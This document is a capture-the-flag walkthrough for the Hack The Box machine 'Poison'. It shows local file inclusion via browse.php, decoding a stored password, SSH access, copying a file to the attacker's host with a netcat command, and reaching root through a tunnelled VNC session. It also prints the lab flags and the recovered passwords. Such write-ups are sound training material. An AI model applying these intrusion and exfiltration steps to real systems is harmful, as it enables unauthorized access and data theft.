Machine:https://app.hackthebox.com/machines/132
IP:10.10.10.84

# Enumeration

Port 80:

/browse.php?file=phpinfo.php

`X-Powered-By 	PHP/5.6.32`

/browse.php?file=listfiles.php

```
Array
(
    [0] => .
    [1] => ..
    [2] => browse.php
    [3] => index.php
    [4] => info.php
    [5] => ini.php
    [6] => listfiles.php
    [7] => phpinfo.php
    [8] => pwdbackup.txt
)
```

/browse.php?file=pwdbackup.txt

```
This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo=
```

Decode

`Charix!2#4%6&8(0`

Login as Charix through SSH

# Exploitation

user.txt eaacdfb2d141b72a589233063604209c

# Post-Exploitation

/home/charix has secret.zip

Transfer to our machine

Victim:

`nc -w 3 10.10.16.12 9001 < secret.zip`

Attacker:

```
nc -lnvp 9001 > output
mv output output.zip
```

Unzip with the SSH password and we got a file `secret`

`unzip output.zip`

But we don't know what this is for

Back on target, we see that VNC is running as root which using password file from /root and connect locally

`root   529   0.0  0.9  23620  8868 v0- I    16:19    0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1`

Checking vncviwer options

```
vncviewer -h

-passwd <PASSWD-FILENAME> (standard VNC authentication)
```

secret might be used with this options, but VNC only hosts locally, so we need tunneling through SSH or proxychains

`tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
`

SSH Tunneling

We tunnel port 5901 on target machine to our local port 5901

`ssh charix@10.10.10.84 -L 5901:localhost:5901`

Connect VNC

`vncviewer 127.0.0.1:5901 -passwd secret`

root.txt 716d04b188419cf2bb99d891272361f5

# Beyond Root

`.vnc/passwd` that root user use to connect to VNC by specify `rfbauth /root/.vnc/passwd` in the target machine is same as the one we unzip.

Decode VNC password

https://github.com/trinitronx/vncpasswd.py

```
python2 vncpasswd.py -d -f ~/htb_lab/poison/www/secret

Decrypted Bin Pass= 'VNCP@$$!'
Decrypted Hex Pass= '564e435040242421'
```
![image](https://github.com/Leng-Phirun/OSCP_Prep_TJNull/assets/100512862/4e6a9c86-9c36-4290-be16-2e6358f2361e)
